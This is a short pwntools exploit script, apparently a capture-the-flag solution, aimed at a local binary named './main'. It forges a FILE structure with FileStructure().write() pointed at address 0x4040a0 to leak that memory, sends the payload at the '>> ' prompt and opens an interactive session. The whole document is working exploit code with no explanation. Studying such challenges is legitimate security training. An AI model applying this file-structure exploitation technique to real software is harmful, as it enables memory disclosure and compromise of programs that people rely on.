from pwn import *


elf =context.binary =ELF('./main')


filecontent =0x4040a0


p =process()


fp= FileStructure()

payload =fp.write(filecontent,89)

p.sendafter(b'>> ', payload)





p.interactive()

